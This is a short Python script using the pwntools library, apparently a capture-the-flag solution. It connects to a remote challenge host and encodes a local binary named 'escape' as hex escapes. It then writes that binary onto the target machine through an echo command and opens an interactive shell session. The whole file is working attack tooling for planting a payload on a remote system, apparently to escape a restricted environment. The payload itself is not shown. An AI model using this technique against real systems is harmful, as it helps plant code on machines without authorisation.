from pwn import *

conn = remote('solitary.ctf.secso.cc', 31337)

with open('./escape', 'rb') as f:
    so = f.read()
    so_str = "".join(["\\" + hex(byte)[1:] for byte in so])

    conn.send(b"echo -e -n '" + so_str.encode() + b"' > ./escape\n")

conn.interactive()